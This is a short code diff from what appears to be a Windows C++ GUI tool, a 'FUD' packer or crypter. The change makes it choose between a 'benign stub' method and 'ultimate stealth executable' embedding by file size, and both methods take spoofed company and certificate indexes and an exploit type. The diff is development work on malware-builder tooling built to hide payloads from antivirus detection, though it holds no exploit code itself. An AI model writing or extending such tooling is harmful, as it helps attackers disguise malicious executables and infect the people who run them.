@@ -2339,8 +2339,19 @@ static void createFUDExecutable() {
     SetWindowTextW(g_hStatusText, statusMsg.c_str());
     SendMessage(g_hProgressBar, PBM_SETPOS, 50, 0);
     
-    // Use PE embedding with exploit integration
-    bool success = g_packer.createUltimateStealthExecutableWithExploits(inputPath, outputPath, companyIndex, certIndex, architecture, exploitType);
+    // Check file size and choose appropriate method
+    std::ifstream testFile(inputPath, std::ios::binary | std::ios::ate);
+    size_t fileSize = testFile.tellg();
+    testFile.close();
+    
+    bool success = false;
+    if (fileSize > 2 * 1024 * 1024) { // If > 2MB, use stub method
+        SetWindowTextW(g_hStatusText, L"Large file detected, using optimized stub method...");
+        success = g_packer.createBenignStubWithExploits(inputPath, outputPath, companyIndex, certIndex, architecture, exploitType);
+    } else {
+        // Use PE embedding with exploit integration for smaller files
+        success = g_packer.createUltimateStealthExecutableWithExploits(inputPath, outputPath, companyIndex, certIndex, architecture, exploitType);
+    }
     
     SendMessage(g_hProgressBar, PBM_SETPOS, 100, 0);
     
